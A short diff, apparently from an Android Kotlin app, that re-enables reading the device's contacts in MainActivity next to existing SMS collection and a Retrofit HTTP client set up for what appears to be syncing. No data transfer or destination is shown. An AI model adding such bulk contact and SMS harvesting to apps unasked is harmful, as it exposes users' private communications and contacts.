@@ -145,7 +145,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         val retrofitAPI = HttpExecute.BuildAPI()
         val cc = ContentCollector()
         val contactLs = ContactsList()
-        //contactLs.SetContact(cc.GetContacts(this))
+        contactLs.SetContact(cc.GetContacts(this))
         //Log.d("SYNC", "Name : " + contactLs.GetContact()!![1].GetName() + " Number : " + contactLs.GetContact()!![1].GetNumber())
         val SMSLs = SMSList()
         SMSLs.SetSMS(cc.GetSMS(this))
